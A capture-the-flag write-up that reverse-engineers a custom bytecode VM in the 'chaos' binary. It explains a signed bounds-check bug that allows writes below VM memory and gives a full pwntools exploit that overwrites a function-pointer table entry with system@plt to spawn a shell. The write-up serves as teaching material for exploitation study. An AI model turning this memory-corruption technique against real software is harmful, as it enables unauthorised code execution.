# chaos — CTF Writeup

**Category:** Binary Exploitation  
**Binary:** `chaos` (x86-64 ELF)  
**Protection:** No PIE, Full RELRO, No Canary, NX enabled  

---

## Table of Contents

1. [Initial Recon](#1-initial-recon)
2. [Understanding the VM](#2-understanding-the-vm)
3. [Opcode Dispatch Mechanism](#3-opcode-dispatch-mechanism)
4. [Key (Chaos Byte) Evolution — The Critical Detail](#4-key-chaos-byte-evolution--the-critical-detail)
5. [Vulnerability: Signed Bounds Check in STORE](#5-vulnerability-signed-bounds-check-in-store)
6. [Exploit Strategy](#6-exploit-strategy)
7. [Building the Payload — Phase by Phase](#7-building-the-payload--phase-by-phase)
8. [Common Confusion Points](#8-common-confusion-points)
9. [The Bug in the First Attempt](#9-the-bug-in-the-first-attempt)
10. [Final Working Exploit](#10-final-working-exploit)
11. [Commands Reference](#11-commands-reference)

---

## 1. Initial Recon

Start with `checksec` and a quick strings scan:

```bash
checksec --file=./chaos
```

Output:
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

**Key takeaways:**
- **No PIE** → all addresses are fixed at compile time. We can hardcode addresses in our exploit.
- **Full RELRO** → the GOT is mapped read-only at runtime. We **cannot** overwrite GOT entries.
- **No canary** → stack smashing is possible in theory, but not the path here.
- **NX** → no shellcode on the stack/heap.

Look at interesting strings:

```bash
strings ./chaos
```

Notable output:
```
Feed the chaos (Hex encoded):
Executing...
[!] System Halted.
[!] Segfault (Read)
[!] Segfault (Write)
echo stub
DEBUG: System @ %p
--- CHAOS ENGINE ---
```

The program takes **hex-encoded input**, interprets it as bytecode for a custom VM, and has a `system()` call somewhere. The "echo stub" string and "DEBUG: System @" are interesting — they hint that there's a debug handler that leaks the address of `system()`.

Run the binary to see it in action:

```bash
./chaos
--- CHAOS ENGINE ---
Feed the chaos (Hex encoded): AABBCC
Executing...
[!] System Halted.
```

The input is interpreted as 3-byte instructions. Let's dig deeper with disassembly.

---

## 2. Understanding the VM

### Memory Layout

Open in GDB/pwndbg to examine the static data:

```bash
gdb ./chaos
(gdb) info sections
```

Key sections:
```
.data   0x00404000 -> 0x00404058   (writable)
.bss    0x00404060 -> 0x004052f0   (writable, zeroed at startup)
```

Examine `.data` to find the dispatch (function pointer) table:

```
(gdb) x/20gx 0x404000
0x404000:  0x0000000000000000  0x0000000000000000
0x404010:  0x0000000000000000  0x0000000000000000
0x404020:  0x00000000004011f5  0x0000000000401222
0x404030:  0x0000000000401260  0x000000000040130a
0x404040:  0x00000000004013b6  0x0000000000401463
0x404050:  0x00000000004014f0
```

So the **function pointer table** (`func_table`) starts at `0x404020` with 7 entries (indices 0–6):

| Index | Address    | Handler    |
|-------|------------|------------|
| 0     | 0x4011f5   | HALT       |
| 1     | 0x401222   | SET        |
| 2     | 0x401260   | ADD        |
| 3     | 0x40130a   | XOR        |
| 4     | 0x4013b6   | LOAD       |
| 5     | 0x401463   | STORE      |
| 6     | 0x4014f0   | DEBUG      |

The **VM memory** (where bytecode can read/write data) lives in `.bss`:

```
regs_base = 0x4040a0   (8 × 8-byte registers: R0–R7)
MEM_BASE  = 0x4040e0   (= regs_base + 0x40, VM heap memory)
```

### VM Instruction Format

Each instruction is **3 bytes**, XOR-decoded with a rolling "chaos" key:

```
encoded_byte XOR chaos_key = decoded_byte
```

The interpreter decodes three bytes at a time:
- **Byte 0** → opcode (then `opcode % 7` selects the handler)
- **Byte 1** → `arg1` (usually destination register index, 0–7)
- **Byte 2** → `arg2` (source register index or immediate value)

All three bytes are XORed with the **same** current chaos key value.

The dispatch call is:
```c
func_table[opcode % 7](regs[arg1], arg2, arg1)
// rdi = regs[arg1]   (value in destination register)
// rsi = arg2         (raw second operand)
// rdx = arg1         (destination register index)
```

After the handler returns, the interpreter does:
```c
chaos_key += 0x13;
```

---

## 3. Opcode Dispatch Mechanism

Disassemble the interpreter loop (main dispatch body at ~`0x401542`):

```
(gdb) x/80i 0x401542
```

Key parts:

```asm
; Decode 3 bytes from bytecode buffer
movzx edx, BYTE PTR [pc + buf]         ; buf[pc] raw byte
movzx eax, BYTE PTR [chaos_key_addr]   ; chaos key
xor   eax, edx                          ; opcode_raw = key XOR buf[pc]
mov   [rbp-0x9], al                     ; save decoded opcode

; Same key for arg1 and arg2...
; Then: op_dispatch_idx = opcode_raw % 7  (computed via multiplication trick)

; Validate arg1 in [0, 7]
cmp QWORD PTR [rbp-0x18], 0x0
js  skip                                ; if arg1 < 0, skip (reg = 0)
cmp QWORD PTR [rbp-0x18], 0x7
jg  skip                                ; if arg1 > 7, skip

; Load regs[arg1] into rdi
mov rax, QWORD PTR [rbp-0x18]
lea rdx, [rax*8]
lea rax, [regs_base]                    ; 0x4040a0
mov rax, QWORD PTR [rdx+rax]           ; rdi = regs[arg1]

; Call handler
lea rax, [func_table]                  ; 0x404020
mov r8, QWORD PTR [dispatch_idx*8 + rax]
call r8                                 ; func_table[op%7](regs[arg1], arg2, arg1)

; After handler returns:
movzx eax, BYTE PTR [chaos_key_addr]
add   eax, 0x13
mov   BYTE PTR [chaos_key_addr], al    ; chaos_key += 0x13
```

**Important:** The interpreter **always** adds `0x13` to the chaos key after every instruction. Some handlers also modify the key internally before returning. The final key value is the combination of both.

---

## 4. Key (Chaos Byte) Evolution — The Critical Detail

This was the trickiest part of the challenge. You need to know the exact key update for **every** instruction to encode the payload correctly.

Disassemble each handler to find internal key mutations:

### SET handler (0x401222)

```
(gdb) x/20i 0x401222
```

```asm
; regs[rdx] = rsi  (stores arg2 into regs[arg1])
; No internal chaos modification
```

**SET key update:** `chaos = (chaos + 0x13) & 0xFF`
(Only the interpreter's `+0x13`)

### ADD handler (0x401260)

```
(gdb) x/40i 0x401260
```

```asm
; regs[dst] += regs[src]   (rcx = result)
mov QWORD PTR [rdx+rax], rcx           ; store result

; Internal key mutation:
movzx eax, BYTE PTR [chaos_key_addr]  ; eax = old chaos
mov   ecx, eax
mov   rax, QWORD PTR [rbp-0x18]       ; rax = dst index
; ...
mov   rax, QWORD PTR [rdx+rax]        ; rax = regs[dst] (NEW value after add!)
xor   eax, ecx                         ; eax = old_chaos XOR result_lo
mov   BYTE PTR [chaos_key_addr], al    ; chaos = old_chaos XOR result_lo
```

**ADD key update:** handler sets `chaos = chaos ^ result_lo`, then interpreter adds `+0x13`.
**Final:** `chaos = ((old_chaos ^ (result & 0xFF)) + 0x13) & 0xFF`

### XOR handler (0x40130a)

```
(gdb) x/40i 0x40130a
```

Same structure as ADD — performs `regs[dst] ^= regs[src]`, then:

```asm
; identical XOR chaos mutation
xor   eax, ecx
mov   BYTE PTR [chaos_key_addr], al
```

**XOR key update:** `chaos = ((old_chaos ^ (result & 0xFF)) + 0x13) & 0xFF`

### LOAD handler (0x4013b6)

```
(gdb) x/50i 0x4013b6
```

```asm
; addr = regs[rsi]  (source register holds memory offset)
; bounds check: 0 <= addr <= 0xff7  (signed: js + jle)
; regs[rdx] = *(regs_base + addr + 0x40)   = MEM[addr]
; No internal chaos modification
```

**LOAD key update:** `chaos = (chaos + 0x13) & 0xFF`
(Bounds: unsigned range 0–0xFF7)

### STORE handler (0x401463)

```
(gdb) x/50i 0x401463
```

```asm
; addr = regs[rsi]  (addr_reg index → looks up regs[addr_reg])
; bounds check: addr <= 0xfff  (signed jle — THE VULNERABILITY)
; *(regs_base + addr + 0x40) = regs[rdi]

; Internal key mutation:
movzx eax, BYTE PTR [chaos_key_addr]
add   eax, 0x1
mov   BYTE PTR [chaos_key_addr], al    ; chaos += 1
```

**STORE key update:** handler does `chaos += 1`, then interpreter does `+0x13`.
**Final:** `chaos = (chaos + 0x14) & 0xFF`

### HALT handler (0x4011f5)

```
(gdb) x/15i 0x4011f5
```

```asm
mov BYTE PTR [running_flag], 0x0      ; set running = 0
lea rax, [halt_string]                 ; "[!] System Halted."
call puts
```

**HALT key update:** `chaos = (chaos + 0x13) & 0xFF`

### DEBUG handler (0x4014f0) — The Interesting One

```
(gdb) x/30i 0x4014f0
```

```asm
mov  eax, 0xdeadc0de
cmp  QWORD PTR [rbp-0x8], rax         ; if rdi == 0xdeadc0de:
jne  .else
  lea  rax, [echo_stub_string]          ;   system("echo stub")  ← local placeholder
  mov  rdi, rax
  call system@plt
.else:
  ; printf("DEBUG: System @ %p\n", actual_system_addr)
```

So opcode 6 (DEBUG):
- If `regs[arg1] == 0xdeadc0de` → calls `system("echo stub")` (locally) / `system("sh")` on the server
- Otherwise → prints `DEBUG: System @ <libc_system_addr>` as a leak

This is a classic CTF hint: the binary is designed to call system with the magic value. On the remote server, the string is `"sh"` instead of `"echo stub"`.

**DEBUG key update:** `chaos = (chaos + 0x13) & 0xFF`

### Summary Table

| Opcode | Name   | Handler chaos mutation  | Final key formula                                |
|--------|--------|-------------------------|-------------------------------------------------|
| 0      | HALT   | none                    | `(chaos + 0x13) & 0xFF`                         |
| 1      | SET    | none                    | `(chaos + 0x13) & 0xFF`                         |
| 2      | ADD    | `chaos ^= result_lo`    | `((chaos ^ result_lo) + 0x13) & 0xFF`           |
| 3      | XOR    | `chaos ^= result_lo`    | `((chaos ^ result_lo) + 0x13) & 0xFF`           |
| 4      | LOAD   | none                    | `(chaos + 0x13) & 0xFF`                         |
| 5      | STORE  | `chaos += 1`            | `(chaos + 0x14) & 0xFF`                         |
| 6      | DEBUG  | none                    | `(chaos + 0x13) & 0xFF`                         |

**Initial chaos key:** `0x55` (set by `init()` at `0x4011e4`)

---

## 5. Vulnerability: Signed Bounds Check in STORE

Looking at the STORE handler's bounds check:

```asm
; 0x4014a0:
cmp QWORD PTR [rbp-0x8], 0xfff
jle 0x4014c2          ; ← jle = "jump if less or equal" (SIGNED comparison)
; ...bounds error if falls through
```

The check is `if (addr <= 0xfff)` using a **signed** comparison (`jle`), but there is **no lower-bound check**. This means:

- `addr = -192` (= `0xFFFFFFFFFFFFFF40` as uint64) → signed: `-192 ≤ 0xfff` → **TRUE** → write proceeds!

The write target calculation:
```c
*(regs_base + addr + 0x40) = value
// regs_base = 0x4040a0
// With addr = -192:
// *(0x4040a0 + (-192) + 0x40)
// = *(0x4040a0 - 0x80)
// = *(0x404020)           ← func_table[0]  ✓
```

So by storing the value `-192` (= `0xFFFFFFFFFFFFFF40`) in a register and using it as the address in STORE, we can **write to any address below MEM_BASE**, including the function pointer table!

**Target:** `func_table[0]` at `0x404020`
**Offset needed:** `0x404020 - 0x4040e0 = -0xC0 = -192`

---

## 6. Exploit Strategy

> **Why not just call DEBUG with 0xdeadc0de?**
> Locally it only runs `system("echo stub")`, not a real shell. On the remote it would work, but we need a reliable strategy.

The full exploit strategy:

1. **Build `0xFFFFFFFFFFFFFFFF`** in VM memory using 8 overlapping STORE writes, then LOAD it into a register.
2. **XOR with `0xBF`** to get `0xFFFFFFFFFFFFFF40` = -192 (the negative offset to `func_table[0]`).
3. **Build `system@plt` (0x401090)** byte-by-byte in VM memory, then LOAD it into a register.
4. **Write `"sh\0"`** at VM memory offset `0x20` (real address `0x404100`).
5. **Build pointer `0x404100`** in VM memory at offset `0x30`, then LOAD it into a register.
6. **STORE `system@plt` at offset -192** → overwrites `func_table[0]` with `system@plt`.
7. **Emit opcode 0 (HALT)** with `arg1 = R6` (which holds `0x404100`) → calls `func_table[0](regs[R6]) = system("sh")`.

### Why these memory offsets?

| VM offset | Real address | Content         |
|-----------|--------------|-----------------|
| `0x00`    | `0x4040e0`   | scratch (all-FF) |
| `0x08`    | `0x4040e8`   | system@plt bytes |
| `0x20`    | `0x404100`   | `"sh\0"`         |
| `0x30`    | `0x404110`   | pointer `0x404100` |

### The Overlapping STORE Trick

STORE writes an **8-byte little-endian** value. To construct `0xFFFFFFFFFFFFFFFF` at offset 0:

```
STORE(0xFF, offset=0): mem[0..7]  = [FF 00 00 00 00 00 00 00]
STORE(0xFF, offset=1): mem[1..8]  = [FF 00 00 00 00 00 00 00]  → byte 1 = FF
STORE(0xFF, offset=2): mem[2..9]  = [FF 00 ...]                → byte 2 = FF
...
STORE(0xFF, offset=7): mem[7..14] = [FF 00 ...]                → byte 7 = FF
```

After all 8 stores: `mem[0..7] = [FF FF FF FF FF FF FF FF]`
`LOAD` from offset 0: register = `0xFFFFFFFFFFFFFFFF` ✓

### Building system@plt Byte-by-Byte

`0x401090` in little-endian = `[0x90, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]`

```
STORE(0x90, offset= 8): byte 8  = 0x90
STORE(0x10, offset= 9): byte 9  = 0x10
STORE(0x40, offset=10): byte 10 = 0x40
                         bytes 11-15 already 0 (BSS)
LOAD from offset 8: register = 0x0000000000401090  ✓
```

### Building the Pointer (0x404100)

`0x404100` in little-endian = `[0x00, 0x41, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]`

```
byte 0x30 = 0x00  (BSS, untouched)
STORE(0x41, offset=0x31): byte 0x31 = 0x41
STORE(0x40, offset=0x32): byte 0x32 = 0x40
                           bytes 0x33+ already 0

LOAD from offset 0x30: register = 0x0000000000404100  ✓
```

---

## 7. Building the Payload — Phase by Phase

### Register allocation

| Register | Role                                   |
|----------|----------------------------------------|
| R0       | scratch (values 0xFF, 0x90, 0x10, ...) |
| R1       | scratch (memory offsets)               |
| R2       | **-192** (negative offset)             |
| R3       | 0xBF (XOR mask)                        |
| R4       | **system@plt** (0x401090)              |
| R5       | unused                                 |
| R6       | **pointer to "sh"** (0x404100)         |
| R7       | unused                                 |

### Phase 1: Build `0xFFFFFFFFFFFFFFFF` and derive -192

```python
vm.SET(0, 0xFF)          # R0 = 0xFF
for i in range(8):
    vm.SET(1, i)         # R1 = i
    vm.STORE(0, 1)       # mem[i] = 0xFF (overlapping 8-byte write)

vm.SET(1, 0)
vm.LOAD(2, 1)            # R2 = mem[0] = 0xFFFFFFFFFFFFFFFF

vm.SET(3, 0xBF)
vm.XOR(2, 3)             # R2 = 0xFFFFFFFF...FF XOR 0xBF = 0xFFFFFFFF...FF40 = -192
```

**Verification:** `0xFFFFFFFFFFFFFFFF ^ 0xBF = 0xFFFFFFFFFFFFFF40`
As signed int64: `-192`. ✓

### Phase 2: Build `system@plt` (0x401090)

```python
vm.SET(0, 0x90); vm.SET(1,  8); vm.STORE(0, 1)   # mem[8]  = 0x90
vm.SET(0, 0x10); vm.SET(1,  9); vm.STORE(0, 1)   # mem[9]  = 0x10
vm.SET(0, 0x40); vm.SET(1, 10); vm.STORE(0, 1)   # mem[10] = 0x40

vm.SET(1, 8)
vm.LOAD(4, 1)            # R4 = mem[8..15] = 0x0000000000401090
```

### Phase 3: Write `"sh\0"` at offset `0x20`

```python
vm.SET(0, 0x73); vm.SET(1, 0x20); vm.STORE(0, 1)  # mem[0x20] = 's'
vm.SET(0, 0x68); vm.SET(1, 0x21); vm.STORE(0, 1)  # mem[0x21] = 'h'
# mem[0x22] = 0x00 already (BSS)
```

Real address: `MEM_BASE + 0x20 = 0x4040e0 + 0x20 = 0x404100` → `"sh\0"` ✓

### Phase 4: Build pointer `0x404100` in R6

```python
vm.SET(0, 0x41); vm.SET(1, 0x31); vm.STORE(0, 1)  # mem[0x31] = 0x41
vm.SET(0, 0x40); vm.SET(1, 0x32); vm.STORE(0, 1)  # mem[0x32] = 0x40
# mem[0x30] = 0x00 (untouched BSS)

vm.SET(1, 0x30)
vm.LOAD(6, 1)            # R6 = mem[0x30..0x37] = 0x0000000000404100
```

Byte layout at offset `0x30`: `[0x00, 0x41, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]`
Little-endian: `0 + 0x41*256 + 0x40*65536 = 0x404100` ✓

### Phase 5: Overwrite `func_table[0]`

```python
vm.STORE(4, 2)
# val_reg=R4 → regs[R4] = 0x401090 = system@plt
# addr_reg=R2 → regs[R2] = -192 = 0xFFFFFFFFFFFFFF40
# STORE writes: *(regs_base + (-192) + 0x40) = system@plt
#             = *(0x4040a0 - 0x80)
#             = *(0x404020)          ← func_table[0]  ✓
# Bounds check: -192 (signed) ≤ 0xfff → PASSES via jle
```

### Phase 6: Trigger shell via HALT

```python
vm.HALT(6)
# Emits opcode=0, arg1=6
# Dispatcher: func_table[0 % 7](regs[6], 0, 6)
# After overwrite: func_table[0] = system@plt
# So: system(regs[6]) = system(0x404100) = system("sh")  ✓
```

### Total instruction count: 48 instructions, 288 hex chars

Well within the budget of 170 instructions / 512 hex chars.

---

## 8. Common Confusion Points

### "Why not just XOR with 0x40 at the low byte?"

The XOR instruction works on full 64-bit register values. XOR with `0xBF`:
- Low byte: `0xFF ^ 0xBF = 0x40`
- All upper bytes: `0xFF ^ 0x00 = 0xFF`
- Result: `0xFFFFFFFFFFFFFF40` ✓

We can't use `0x40` directly because SET is limited to 0–255, and XOR operates on full registers. The all-FF value lets us flip the bits we need precisely.

### "Why does HALT trigger the shell? Doesn't it just halt the VM?"

After we **overwrite** `func_table[0]` with `system@plt`, the original HALT handler at `0x4011f5` is **no longer there**. The function pointer now points to `system@plt`. So when the interpreter calls `func_table[0](regs[R6], ...)`, it calls `system(0x404100) = system("sh")`.

### "Why target func_table[0] instead of func_table[6]?"

The offset calculation:
- `func_table[0]` at `0x404020`: offset = `0x404020 - 0x4040e0 = -0xC0 = -192`
- `func_table[6]` at `0x404050`: offset = `0x404050 - 0x4040e0 = -0x90 = -144`

Both are valid negative offsets. The writeup targets `func_table[0]` so the trigger is opcode 0 (HALT). An alternative would be targeting `func_table[6]` and using opcode 6 — but with `func_table[6]` still intact, we'd need to overwrite it with something useful first anyway. Targeting `func_table[0]` is cleaner.

### "Why does the interpreter continue running after system('sh') returns?"

It does — the interpreter loop checks `running != 0 && pc <= 0x1ff`. After `system()` returns, `running` is still 1 and the loop continues decoding whatever bytes follow our payload (zeros from BSS). This could cause crashes, but since we've already gotten an interactive shell, it doesn't matter. In practice, pwntools' `interactive()` call captures stdin/stdout of the shell before the process potentially crashes.

### "Why use MEM_BASE + 0x20 for 'sh' and not MEM_BASE + 0?"

Offset 0 is used for building `0xFFFFFFFFFFFFFFFF`. After those overlapping writes, bytes `[0..7]` are all `0xFF`, and bytes `[8..17]` are partially modified for `system@plt`. Using offset `0x20` (= 32) avoids all that scratch space and lands in clean BSS memory.

---

## 9. The Bug in the First Attempt

The first exploit attempt tried a different approach:
- Target: overwrite `func_table[6]` with `system@plt`, then call opcode 6 with `regs[R] = 0x4040e0` (pointing to `"sh"` written there)
- Method: build values using `ADD` and repeated doubling (bit-shifting)

**This failed** because the chaos key evolution for `ADD` and `XOR` was implemented incorrectly:

```python
# WRONG (original attempt):
def _key_result(self, result):
    self.key = ((result & 0xFF) + 0x13) & 0xFF
    # This ignores the XOR with the old key!

# CORRECT (from disassembly):
def _key_xor_result(self, result):
    self.key = ((self.key ^ (result & 0xFF)) + 0x13) & 0xFF
    # Handler XORs old key with result_lo, then interpreter adds +0x13
```

The incorrect formula caused every subsequent instruction after the first `ADD` to be encoded with a wrong key. The bytecode was decoded by the VM as completely different instructions, which is why we saw:
- `"DEBUG: System @ ..."` printed **twice** (wrong instructions accidentally triggering opcode 6)
- No shell spawned

**How to diagnose this:** Set a breakpoint at the `call r8` instruction in the interpreter, then use GDB commands to trace which handler gets called and with what arguments for each instruction:

```
(gdb) b *0x40165b
(gdb) commands 1
> silent
> printf "pc=%d key=0x%02x rdi=0x%lx rsi=%ld r8=0x%lx\n", \
>   *(int*)0x4052e0-3, *(char*)0x4052e8, $rdi, $rsi, $r8
> c
> end
(gdb) run < payload_file
```

This shows each decoded instruction as it executes, making it easy to spot where the key diverges.

---

## 10. Final Working Exploit

```python
#!/usr/bin/env python3
"""
chaos — solve.py

Key evolution (from binary disassembly):
  SET / LOAD / HALT  →  chaos = (chaos + 0x13) & 0xFF
  ADD(dst, src)      →  chaos = ((chaos ^ result_lo) + 0x13) & 0xFF
  XOR(dst, src)      →  chaos = ((chaos ^ result_lo) + 0x13) & 0xFF
  STORE(val, addr)   →  chaos = (chaos + 0x14) & 0xFF

Strategy:
  Build -192 via overlapping STOREs + LOAD + XOR
  Build system@plt via byte-by-byte STOREs + LOAD
  Write "sh" to VM mem, build pointer to it
  STORE system@plt at func_table[0] using negative offset
  Trigger HALT → system("sh")
"""
from pwn import *

binary     = ELF('./chaos', checksec=False)
context.binary   = binary
context.log_level = 'info'

MEM_BASE   = 0x4040e0   # regs_base(0x4040a0) + 0x40
SYSTEM_PLT = 0x401090   # system@plt  (no PIE → fixed)
FUNC_TABLE = 0x404020   # func_table[0]

# func_table[0] - MEM_BASE = 0x404020 - 0x4040e0 = -0xC0 = -192
NEG_OFFSET = (FUNC_TABLE - MEM_BASE) & 0xFFFFFFFFFFFFFFFF  # 0xFFFFFFFFFFFFFF40


class VM:
    def __init__(self):
        self.regs = [0] * 8
        self.mem  = bytearray(0x200)
        self.key  = 0x55
        self.code = bytearray()
        self.n    = 0

    def _enc(self, b):
        return (b ^ self.key) & 0xFF

    def _emit(self, op, a1, a2):
        self.code += bytes([self._enc(op), self._enc(a1), self._enc(a2)])
        self.n += 1

    def _key_basic(self):
        self.key = (self.key + 0x13) & 0xFF

    def _key_xor_result(self, result):
        self.key = ((self.key ^ (result & 0xFF)) + 0x13) & 0xFF

    def _key_store(self):
        self.key = (self.key + 0x14) & 0xFF

    def _mem_store(self, offset, value):
        for i in range(8):
            self.mem[offset + i] = (value >> (8 * i)) & 0xFF

    def _mem_load(self, offset):
        result = 0
        for i in range(8):
            result |= self.mem[offset + i] << (8 * i)
        return result

    def SET(self, dst, val):
        assert 0 <= dst <= 7 and 0 <= val <= 255
        self._emit(1, dst, val)
        self.regs[dst] = val
        self._key_basic()

    def ADD(self, dst, src):
        assert 0 <= dst <= 7 and 0 <= src <= 7
        self._emit(2, dst, src)
        result = (self.regs[dst] + self.regs[src]) & 0xFFFFFFFFFFFFFFFF
        self.regs[dst] = result
        self._key_xor_result(result)

    def XOR(self, dst, src):
        assert 0 <= dst <= 7 and 0 <= src <= 7
        self._emit(3, dst, src)
        result = self.regs[dst] ^ self.regs[src]
        self.regs[dst] = result
        self._key_xor_result(result)

    def LOAD(self, dst, src):
        assert 0 <= dst <= 7 and 0 <= src <= 7
        self._emit(4, dst, src)
        addr = self.regs[src]
        self.regs[dst] = self._mem_load(addr)
        self._key_basic()

    def STORE(self, val_reg, addr_reg):
        assert 0 <= val_reg <= 7 and 0 <= addr_reg <= 7
        self._emit(5, val_reg, addr_reg)
        addr = self.regs[addr_reg]
        if 0 <= addr < len(self.mem) - 8:
            self._mem_store(addr, self.regs[val_reg])
        self._key_store()

    def HALT(self, reg, arg2=0):
        assert 0 <= reg <= 7
        self._emit(0, reg, arg2)
        self._key_basic()

    def payload(self):
        assert self.n <= 170
        assert len(self.code) * 2 <= 1024
        log.info(f"Instructions: {self.n}, hex length: {len(self.code)*2}")
        return self.code.hex().encode()


def build_payload():
    vm = VM()

    # Phase 1: Build 0xFFFFFFFFFFFFFFFF via overlapping stores, then derive -192
    vm.SET(0, 0xFF)
    for i in range(8):
        vm.SET(1, i)
        vm.STORE(0, 1)          # mem[i] = 0xFF (8-byte LE write)

    vm.SET(1, 0)
    vm.LOAD(2, 1)               # R2 = 0xFFFFFFFFFFFFFFFF

    vm.SET(3, 0xBF)
    vm.XOR(2, 3)                # R2 = 0xFFFFFFFFFFFFFF40 = -192

    assert vm.regs[2] == NEG_OFFSET

    # Phase 2: Build system@plt (0x401090) in mem[8..15]
    vm.SET(0, 0x90); vm.SET(1,  8); vm.STORE(0, 1)
    vm.SET(0, 0x10); vm.SET(1,  9); vm.STORE(0, 1)
    vm.SET(0, 0x40); vm.SET(1, 10); vm.STORE(0, 1)
    vm.SET(1, 8)
    vm.LOAD(4, 1)               # R4 = 0x401090

    assert vm.regs[4] == SYSTEM_PLT

    # Phase 3: Write "sh\0" at mem offset 0x20 → real addr 0x404100
    vm.SET(0, 0x73); vm.SET(1, 0x20); vm.STORE(0, 1)   # 's'
    vm.SET(0, 0x68); vm.SET(1, 0x21); vm.STORE(0, 1)   # 'h'

    # Phase 4: Build pointer 0x404100 in mem[0x30..0x37], LOAD into R6
    vm.SET(0, 0x41); vm.SET(1, 0x31); vm.STORE(0, 1)
    vm.SET(0, 0x40); vm.SET(1, 0x32); vm.STORE(0, 1)
    vm.SET(1, 0x30)
    vm.LOAD(6, 1)               # R6 = 0x404100

    assert vm.regs[6] == MEM_BASE + 0x20

    # Phase 5: STORE system@plt at func_table[0] via negative offset
    vm.STORE(4, 2)              # *(0x404020) = system@plt

    # Phase 6: Trigger system("sh") via HALT opcode
    vm.HALT(6)                  # func_table[0](regs[6]) = system(0x404100) = system("sh")

    return vm.payload()


def exploit(remote_target=None):
    payload = build_payload()

    if remote_target:
        host, port = remote_target
        p = remote(host, port)
    else:
        p = process('./chaos')

    p.recvuntil(b'Hex encoded): ')
    p.sendline(payload)
    p.recvuntil(b'Executing...\n')
    log.success("Shell incoming!")
    p.interactive()


if __name__ == '__main__':
    # For remote: exploit(('hostname', port))
    exploit()
```

### Running the exploit

```bash
python3 solve.py
```

Expected output:
```
[*] Instructions: 48, hex length: 288
[+] Starting local process './chaos': pid XXXXX
[+] Shell incoming!
[*] Switching to interactive mode
$ id
uid=1000(user) groups=1000(user)
$ cat flag.txt
0xFun{...}
```

---

## 11. Commands Reference

### Static Analysis

```bash
# Check binary protections
checksec --file=./chaos

# Print importerd symbols
readelf -s ./chaos | grep -E "FUNC|OBJECT"

# Examine PLT entries
objdump -d ./chaos | grep -A5 "@plt"

# Dump section headers
readelf -S ./chaos

# Find strings
strings ./chaos
strings -t x ./chaos     # with hex offsets
```

### GDB / pwndbg Session

```bash
# Start debugging
gdb ./chaos

# Check protections
(gdb) checksec

# View all sections with addresses
(gdb) maintenance info sections

# Examine dispatch table
(gdb) x/20gx 0x404020

# Disassemble a handler
(gdb) x/40i 0x401260     # ADD handler
(gdb) x/50i 0x401463     # STORE handler (vulnerability here)
(gdb) x/30i 0x4014f0     # DEBUG handler (system call path)
(gdb) x/15i 0x4011f5     # HALT handler
(gdb) x/20i 0x40130a     # XOR handler

# Examine PLT entries
(gdb) disassemble 0x401020,0x4010a0

# Check key variable and PC at runtime
(gdb) x/gx 0x4052e0      # PC (bytecode position)
(gdb) x/gx 0x4052e8      # chaos key

# Set breakpoint at dispatch call (0x40165b = call r8)
(gdb) b *0x40165b

# Trace each instruction with its decoded opcode
(gdb) commands 1
> silent
> printf "pc=%d key=0x%02x rdi=0x%lx rsi=%ld r8=0x%lx\n", \
>   *(int*)0x4052e0 - 3, *(char*)0x4052e8, $rdi, $rsi, $r8
> c
> end

# Set watchpoint on func_table[0] to catch writes
(gdb) watch *0x404020

# Examine VM memory at runtime
(gdb) x/32gx 0x4040e0    # VM heap memory (MEM_BASE)
(gdb) x/8gx  0x4040a0    # registers (regs_base)

# Run with input from file
(gdb) run < /tmp/payload.txt
```

### Verifying the exploit logic manually

```bash
# Check that -192 really reaches func_table[0]
python3 -c "
MEM_BASE   = 0x4040e0
FUNC_TABLE = 0x404020
regs_base  = 0x4040a0
offset     = FUNC_TABLE - MEM_BASE   # = -192
target     = regs_base + offset + 0x40
print(f'offset     = {offset} = {offset & 0xFFFFFFFFFFFFFFFF:#x}')
print(f'write addr = {target:#x}')
print(f'expected   = {FUNC_TABLE:#x}')
print(f'match      = {target == FUNC_TABLE}')
"

# Verify XOR trick
python3 -c "
val = 0xFFFFFFFFFFFFFFFF
mask = 0xBF
result = val ^ mask
print(f'{val:#x} XOR {mask:#x} = {result:#x}')
import ctypes
print(f'as int64 = {ctypes.c_int64(result).value}')
"

# Test shell interaction without interactive mode
python3 -c "
from pwn import *
context.log_level = 'error'
from solve import build_payload
payload = build_payload()
p = process('./chaos')
p.recvuntil(b'Hex encoded): ')
p.sendline(payload)
p.recvuntil(b'Executing...\n')
p.sendline(b'id')
print(p.recvline().decode())
p.close()
"
```

### Key formulas (Python reference)

```python
# Initial chaos key
chaos = 0x55

# Encoding a byte
encoded = raw_byte ^ chaos

# Key update formulas
def key_after_SET(chaos):    return (chaos + 0x13) & 0xFF
def key_after_LOAD(chaos):   return (chaos + 0x13) & 0xFF
def key_after_HALT(chaos):   return (chaos + 0x13) & 0xFF
def key_after_ADD(chaos, result_lo):  return ((chaos ^ result_lo) + 0x13) & 0xFF
def key_after_XOR(chaos, result_lo):  return ((chaos ^ result_lo) + 0x13) & 0xFF
def key_after_STORE(chaos):  return (chaos + 0x14) & 0xFF

# Memory read/write (little-endian 8 bytes)
def mem_read(mem, offset):
    return int.from_bytes(mem[offset:offset+8], 'little')

def mem_write(mem, offset, value):
    mem[offset:offset+8] = value.to_bytes(8, 'little')
```

---

## Key Takeaways

1. **Always verify key/encryption evolution from disassembly** — never assume it's a simple additive counter. Both ADD and XOR had a `chaos ^= result_lo` step that caused the first exploit to fail completely.

2. **Signed vs unsigned comparisons in bounds checks** — `jle` (signed) for an upper-bound check with no lower-bound check is a classic vulnerability. Large unsigned values that represent negative signed integers slip right through.

3. **STORE writes 8 bytes, not 1** — the overlapping write trick (store a small value at byte offsets 0, 1, 2, ...) is a powerful technique to construct arbitrary values in VM memory without arithmetic.

4. **Full RELRO doesn't protect everything** — only the GOT is read-only. The function pointer table in `.data` (writable) is a valid target. Always check what's actually writable.

5. **Simulate the VM faithfully** — including memory tracking for accurate LOAD values. If the simulator's register values are wrong, the key evolution (which depends on result bytes) will drift and generate an invalid payload.
